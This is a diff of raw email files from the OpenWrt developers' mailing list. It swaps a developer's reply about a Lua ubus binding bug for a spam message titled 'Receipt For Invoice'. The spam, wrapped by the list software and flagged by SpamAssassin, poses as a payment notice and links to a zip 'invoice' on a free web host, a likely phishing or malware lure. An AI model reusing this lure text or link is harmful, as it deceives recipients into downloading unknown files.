@@ -2,94 +2,432 @@ Return-Path: <openwrt-devel-bounces+lists+openwrt-devel=lfdr.de@lists.openwrt.or
 X-Original-To: lists+openwrt-devel@lfdr.de
 Delivered-To: lists+openwrt-devel@lfdr.de
 Received: from bombadil.infradead.org (bombadil.infradead.org [IPv6:2607:7c80:54:e::133])
-	by mail.lfdr.de (Postfix) with ESMTPS id E5F5D1FAF7D
-	for <lists+openwrt-devel@lfdr.de>; Tue, 16 Jun 2020 13:48:04 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 648E81FAFF6
+	for <lists+openwrt-devel@lfdr.de>; Tue, 16 Jun 2020 14:14:54 +0200 (CEST)
 DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
-	d=lists.infradead.org; s=bombadil.20170209; h=Sender:Content-Type:
-	Content-Transfer-Encoding:Cc:List-Subscribe:List-Help:List-Post:List-Archive:
-	List-Unsubscribe:List-Id:Subject:Message-ID:References:In-Reply-To:To:From:
-	Date:MIME-Version:Reply-To:Content-ID:Content-Description:Resent-Date:
-	Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:List-Owner;
-	 bh=r00RnlIRcDZJ641ITMYy6xjnLxdsk+7qOE+uyxuHjL4=; b=P9k9sGjWWQS0uwVZrXzNya/eV
-	G+v6ZT3elQRv9YNDn6Rp3mQi5HOL+0GSf5Fg5vdVmNyS29VlyZv7sgepawoEJ6bOQhxOA1EG2qd+y
-	tubW24pRau+tFsliaWNbY9qiRAU0cdKri8T43OaA52o2H+R+MtYT9PMx8QOEVNLD1uoASFxj7AuTC
-	/oCDD2f9kyfYFGmfj5rzqgTYcXm7/wkbi4SsvgmfemGb0F4g6ELqV7FyT9nHH2JPG7ZU67Y+RojDl
-	8thV0b0etr4q6IJrkgmb8WOk41qXVzSmpIlVA0KgNE1W4gZVbIykDSS+Ace9usWF1o3OTcJu0mKqK
-	IRbjl47/Q==;
+	d=lists.infradead.org; s=bombadil.20170209; h=Sender:Content-Type:Subject:
+	List-Help:Reply-To:List-Archive:List-Unsubscribe:List-Subscribe:From:
+	List-Post:List-Id:Message-ID:MIME-Version:Date:To:Cc:
+	Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
+	Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
+	References:List-Owner; bh=MLdB6uPVZWjFyWW7oErxXqNUGWqEx3aVzvzbCcTUPAs=; b=hp+
+	84PSrm2eDIPY0m/sxSRe76vQ0qTv/p3FLkOLUEi8dEFF4zdZfgfOsltqsDDsdupUMYaORpNnXu4jL
+	utuF5fdjiByAliPY6Y13a5fGEw2d/aVUlQToTgnkXrmUHAETQ2uDRahjQN64ZBx1dKk6FP4fLg1Wy
+	Hh4Q0w5QKegE1QnWF53aE7I5jog0deegF4JHBOhmsiDx7gPzviJDHjkH6oQvvc9IebGO9DWxi9Mv3
+	i0x2lwVDIjkeynninIluXJAXyccm7jdM4z+HGNCiEtpin+g/gOdUDsJgMU2bczQTjz9eXMoNYHaD/
+	0k4WtsrQACwFIJg48obM3wd6jX70X5g==;
 Received: from localhost ([127.0.0.1] helo=bombadil.infradead.org)
 	by bombadil.infradead.org with esmtp (Exim 4.92.3 #3 (Red Hat Linux))
-	id 1jlA4P-0006So-3U; Tue, 16 Jun 2020 11:48:01 +0000
-Received: from host-88-217-225-28.customer.m-online.net ([88.217.225.28]
- helo=mail.dev.tdt.de)
- by bombadil.infradead.org with esmtp (Exim 4.92.3 #3 (Red Hat Linux))
- id 1jlA4H-0006SI-OE
- for openwrt-devel@lists.openwrt.org; Tue, 16 Jun 2020 11:47:55 +0000
-Received: from mail.dev.tdt.de (localhost [IPv6:::1])
- by mail.dev.tdt.de (Postfix) with ESMTP id 3F112208E4;
- Tue, 16 Jun 2020 11:47:43 +0000 (UTC)
+	id 1jlAUG-0005Wm-Hc; Tue, 16 Jun 2020 12:14:44 +0000
+To: openwrt-devel@lists.openwrt.org
+Date: 16 Jun 2020 14:14:11 +0200
 MIME-Version: 1.0
-Date: Tue, 16 Jun 2020 13:47:43 +0200
-From: Florian Eckert <fe@dev.tdt.de>
-To: Openwrt Devel <openwrt-devel@lists.openwrt.org>
-In-Reply-To: <ef62f1e9dbd3d444557a47d687587bd6@dev.tdt.de>
-References: <ef62f1e9dbd3d444557a47d687587bd6@dev.tdt.de>
-Message-ID: <85fdf49f58b7c9270144620d9a99dfce@dev.tdt.de>
-X-Sender: fe@dev.tdt.de
-User-Agent: Roundcube Webmail/1.1.5
-X-Spam-Status: No, score=-1.0 required=5.0 tests=ALL_TRUSTED,URIBL_BLOCKED
- autolearn=ham autolearn_force=no version=3.4.2
-X-Spam-Checker-Version: SpamAssassin 3.4.2 (2018-09-13) on mail.dev.tdt.de
-X-CRM114-Version: 20100106-BlameMichelson ( TRE 0.8.0 (BSD) ) MR-646709E3 
-X-CRM114-CacheID: sfid-20200616_044753_940640_9079B5E0 
-X-CRM114-Status: UNSURE (   6.29  )
-X-CRM114-Notice: Please train this message.
-X-Spam-Score: 0.8 (/)
-X-Spam-Report: SpamAssassin version 3.4.4 on bombadil.infradead.org summary:
- Content analysis details:   (0.8 points)
- pts rule name              description
- ---- ---------------------- --------------------------------------------------
- 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
- 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
- 0.4 RDNS_DYNAMIC           Delivered to internal network by host with
- dynamic-looking rDNS
- 0.4 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
-Subject: Re: [OpenWrt-Devel] Conversion issue in lua ubus binding
-X-BeenThere: openwrt-devel@lists.openwrt.org
-X-Mailman-Version: 2.1.29
-Precedence: list
+Message-ID: <mailman.23592.1592309678.2542.openwrt-devel@lists.openwrt.org>
 List-Id: <openwrt-devel.lists.openwrt.org>
+List-Post: <mailto:openwrt-devel@lists.openwrt.org>
+From: info--- via openwrt-devel <openwrt-devel@lists.openwrt.org>
+Precedence: list
+X-Mailman-Version: 2.1.29
+X-BeenThere: openwrt-devel@lists.openwrt.org
+List-Subscribe: <http://lists.infradead.org/mailman/listinfo/openwrt-devel>,
+ <mailto:openwrt-devel-request@lists.openwrt.org?subject=subscribe>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/openwrt-devel>, 
  <mailto:openwrt-devel-request@lists.openwrt.org?subject=unsubscribe>
 List-Archive: <http://lists.infradead.org/pipermail/openwrt-devel/>
-List-Post: <mailto:openwrt-devel@lists.openwrt.org>
+Reply-To: info@delivers-solutions.com
 List-Help: <mailto:openwrt-devel-request@lists.openwrt.org?subject=help>
-List-Subscribe: <http://lists.infradead.org/mailman/listinfo/openwrt-devel>,
- <mailto:openwrt-devel-request@lists.openwrt.org?subject=subscribe>
-Cc: "alin.nastac@gmail.com jo@mein.io" <Eckert.Florian@googlemail.com>
-Content-Transfer-Encoding: 7bit
-Content-Type: text/plain; charset="us-ascii"; Format="flowed"
+Subject: [OpenWrt-Devel] Receipt For Invoice
+Content-Type: multipart/mixed; boundary="===============0967337869878152308=="
 Sender: "openwrt-devel" <openwrt-devel-bounces@lists.openwrt.org>
 Errors-To: openwrt-devel-bounces+lists+openwrt-devel=lfdr.de@lists.openwrt.org
 
-> I have recently discovered that there is a conversion problem with the
-> ubus lua binding.
-> I think it is due to the following commit [1] from the ubus project.
-> Can anyone confirm this?
 
-I removed the suspicious commit [1] from my build and did a custom image 
-for x86_64.
-Now the value is displayed correctly again.
-So I can verify myself that the change for 64bit platforms breaks the 
-lua ubus binding.
+--===============0967337869878152308==
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-Best regards
+The sender domain has a DMARC Reject/Quarantine policy which disallows
+sending mailing list messages using the original "From" header.
 
-Florian
+To mitigate this problem, the original message has been wrapped
+automatically by the mailing list software.
+--===============0967337869878152308==
+Content-Type: message/rfc822
+MIME-Version: 1.0
+Content-Disposition: inline
 
-[1] 
-https://git.openwrt.org/?p=project/ubus.git;a=commitdiff;h=171469e3138cce191892e20b6fd35b52c9368064
+Received: from merlin.infradead.org ([2001:8b0:10b:1231::1])
+	by bombadil.infradead.org with esmtps (Exim 4.92.3 #3 (Red Hat Linux))
+	id 1jlAU9-0005WU-7W
+	for openwrt-devel@bombadil.infradead.org; Tue, 16 Jun 2020 12:14:37 +0000
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
+	d=infradead.org; s=merlin.20170209; h=Content-Type:MIME-Version:Message-ID:
+	Date:Subject:To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
+	Content-Description:In-Reply-To:References;
+	bh=kB/cQ6RRdyuEyCgJz1ZnrEdebDWq8uVBGtrdkz3oJ+o=; b=Wodye7miu4uxoAIJA+FjdUAw4l
+	zLIGNRvS7lbtu9UGYsMlOFcd2p0XbmptLtksQHwkuINNvcbkjflpB/eXKsA9TEmml7N5cqO4gYEU0
+	vSOkoeomucjOgdSr0BEKglu3WRPXCzI6tvQOa6GlgIJxDOIR3uIDqBChEhYb9dJGtpX0YqC8N+FYL
+	yhAmKsQfnHRcCSuH2yGpOdy6Geaw9MR1f31my4SnW2sO6Z6GOV55V1F4RoBjwrOzOp8p/RkfavLNr
+	npJx/TOgaZdBUylKQPw4FE6URAKSNYHTx1KxAv/xIcEhCLMRn/A22kvbaoVN4cCFrri+getWouKyB
+	V7ndx6NA==;
+Received: from rdns3.delivers-solutions.com ([147.135.99.23])
+	by merlin.infradead.org with esmtp (Exim 4.92.3 #3 (Red Hat Linux))
+	id 1jlAU6-0000wC-Qz
+	for openwrt-devel@lists.openwrt.org; Tue, 16 Jun 2020 12:14:35 +0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed/relaxed; s=default; d=delivers-solutions.com;
+ h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type; i=info@delivers-solutions.com;
+ bh=h9EfDr+2PTldVCBUpEPjRymfrb4=;
+ b=pTsn7eROANy71R8gDZv0pvqGkFEtDGbzylRZKOUGadKB7Sd/ziHZC0D7eD6kDHdFdSn92WFUwy7p
+   9ewUk5tAiJ/iZmvd+NSYpqJZQeoMAk3O10//O+F3QxwbBGbpnnvz+nQZty4VvIS1UiD+2NEgFNBc
+   MJhBjOlKofkiF82U794=
+DomainKey-Signature: a=rsa-sha1; c=nofws; q=dns; s=default; d=delivers-solutions.com;
+ b=W2LI9y5y19sfj94Hq8eS0UbH/Gl7PF/WFeduxYLkIkX3QPg6KJjGQGiUaw8czT5TIHJq7jdhb1zk
+   HMMc+WxYOTmNTV/DttinOcJkPUYNouC9m7Rg5F7A8vr0v+iNegGyzQRQByirLnBFHp/exxE/3SJj
+   pO0xkQxia4IglJcCkbg=;
+From: info@delivers-solutions.com
+To: openwrt-devel@lists.openwrt.org
+Subject: Receipt For Invoice
+Date: 16 Jun 2020 14:14:11 +0200
+Message-ID: <20200616141411.DE1171038AC90C35@delivers-solutions.com>
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0012_31A71817.0EB2A91B"
+X-Spam-Note: CRM114 invocation failed
+X-Spam-Score: 4.1 (++++)
+X-Spam-Report: SpamAssassin version 3.4.4 on merlin.infradead.org summary:
+ Content analysis details:   (4.1 points)
+ 
+  pts rule name              description
+ ---- ---------------------- --------------------------------------------------
+ -0.0 SPF_PASS               SPF: sender matches SPF record
+  0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
+  0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
+  0.0 HTML_MESSAGE           BODY: HTML included in message
+ -0.1 DKIM_VALID_AU          Message has a valid DKIM or DK signature from
+                             author's domain
+ -0.1 DKIM_VALID             Message has at least one valid DKIM or DK signature
+  0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
+                             valid
+ -0.1 DKIM_VALID_EF          Message has a valid DKIM or DK signature from
+                             envelope-from domain
+  1.7 RAZOR2_CHECK           Listed in Razor2 (http://razor.sf.net/)
+  2.4 RAZOR2_CF_RANGE_51_100 Razor2 gives confidence level above 50%
+                             [cf: 100]
+  0.0 FSL_BULK_SIG           Bulk signature with no Unsubscribe
+
+
+------=_NextPart_000_0012_31A71817.0EB2A91B
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD>
+<META name=3DGENERATOR content=3D"MSHTML 11.00.9600.19699"></HEAD>
+<body>
+<DIV>Hi,<BR><BR></DIV>
+<DIV class=3Ddefault-style>
+<DIV class=3Ddefault-style>
+<DIV class=3Ddefault-style>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+We apologize for the delay in making balance payment, please be advised tha=
+t we have already transferred the full amount to your account for the previ=
+ous invoice.<BR>kindly see the attached slip for your confirmation of paid =
+orders.<BR><BR>You can send to me a final copy and inform ETD asap. I will =
+send the other information with my official email when I report to my offic=
+e tomorrow morning or you can report to our sales department directly.</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Please see attached below</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+<A href=3D"https://file-docs.000webhostapp.com/invoice-pdf.zip"><img border=
+=3D"0" hspace=3D"0" alt=3D"" src=3D"cid:paidinvoice1.jpg" align=3D"baseline=
+" width=3D"60" height=3D"76"></A><BR><A style=3D"TEXT-DECORATION: underline=
+; COLOR: rgb(60,97,170)" href=3D"https://file-docs.000webhostapp.com/invoic=
+e-pdf.zip" rel=3Dnoopener target=3D_blank><SPAN style=3D"TEXT-DECORATION: u=
+nderline">Download</SPAN></A></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR><BR>
+Warmest Regards,</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Angela Wilpert</P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'>
+Sales Executives Dept</P>
+<DIV class=3D"col-xs-12 col-sm-4 col-md-4 col-lg-4" style=3D"BOX-SIZING: bo=
+rder-box; FONT-SIZE: 14px; FONT-FAMILY: COMFORTAA; WIDTH: 390px; WHITE-SPAC=
+E: normal; WORD-SPACING: 0px; POSITION: relative; TEXT-TRANSFORM: none; FLO=
+AT: left; FONT-WEIGHT: 400; COLOR: rgb(211,211,211); PADDING-BOTTOM: 0px; F=
+ONT-STYLE: normal; PADDING-TOP: 0px; PADDING-LEFT: 15px; MARGIN: 0px; MIN-H=
+EIGHT: 1px; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; PADDING-RIGHT: 1=
+5px; BACKGROUND-COLOR: rgb(41,41,41); TEXT-INDENT:=20
+0px; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-tex=
+t-stroke-width: 0px; text-decoration-style: initial; text-decoration-color:=
+ initial">
+<DIV class=3D"dexp-animate animated flipInY" style=3D"BOX-SIZING: border-bo=
+x; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; P=
+ADDING-RIGHT: 0px; VISIBILITY: visible !important; animation-fill-mode: bot=
+h; animation-duration: 1s; animation-name: flipInY; backface-visibility: vi=
+sible">
+<DIV class=3D"dexp-shortcodes-box box-background  box-hexagon box-center" s=
+tyle=3D"BOX-SIZING: border-box; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; PADD=
+ING-LEFT: 0px; MARGIN: 0px; PADDING-RIGHT: 0px">
+<P style=3D'FONT-FAMILY: -apple-system, BlinkMacSystemFont, "Helvetica Neue=
+", "Segoe UI", Arial, sans-serif; MARGIN: 0px 0px 1em'>HDT Sales &amp; Merk=
+ating<BR>vasileos konstantinou 89 Paphos, Paphos, Cyprus<BR>Phone: +357 26 =
+040001</P></DIV></DIV></DIV>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<P style=3D'FONT-SIZE: 13px; FONT-FAMILY: -apple-system, BlinkMacSystemFont=
+, "Helvetica Neue", "Segoe UI", Arial, sans-serif; WHITE-SPACE: normal; WOR=
+D-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(0,0,0); =
+FONT-STYLE: normal; MARGIN: 0px 0px 1em; ORPHANS: 2; WIDOWS: 2; LETTER-SPAC=
+ING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant=
+-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: initi=
+al; text-decoration-color: initial'><BR></P>
+<BR class=3DApple-interchange-newline></DIV></DIV></DIV></BODY></HTML>
+------=_NextPart_000_0012_31A71817.0EB2A91B
+Content-Type: image/jpeg; name="paidinvoice1.jpg"
+Content-Transfer-Encoding: base64
+Content-ID: <paidinvoice1.jpg>
+
+/9j/4AAQSkZJRgABAQEAYABgAAD/4RDcRXhpZgAATU0AKgAAAAgABAE7AAIAAAAGAAAISodp
+AAQAAAABAAAIUJydAAEAAAAMAAAQyOocAAcAAAgMAAAAPgAAAAAc6gAAAAgAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEpFU0tZAAAF
+kAMAAgAAABQAABCekAQAAgAAABQAABCykpEAAgAAAAMwMQAAkpIAAgAAAAMwMQAA6hwABwAA
+CAwAAAiSAAAAABzqAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
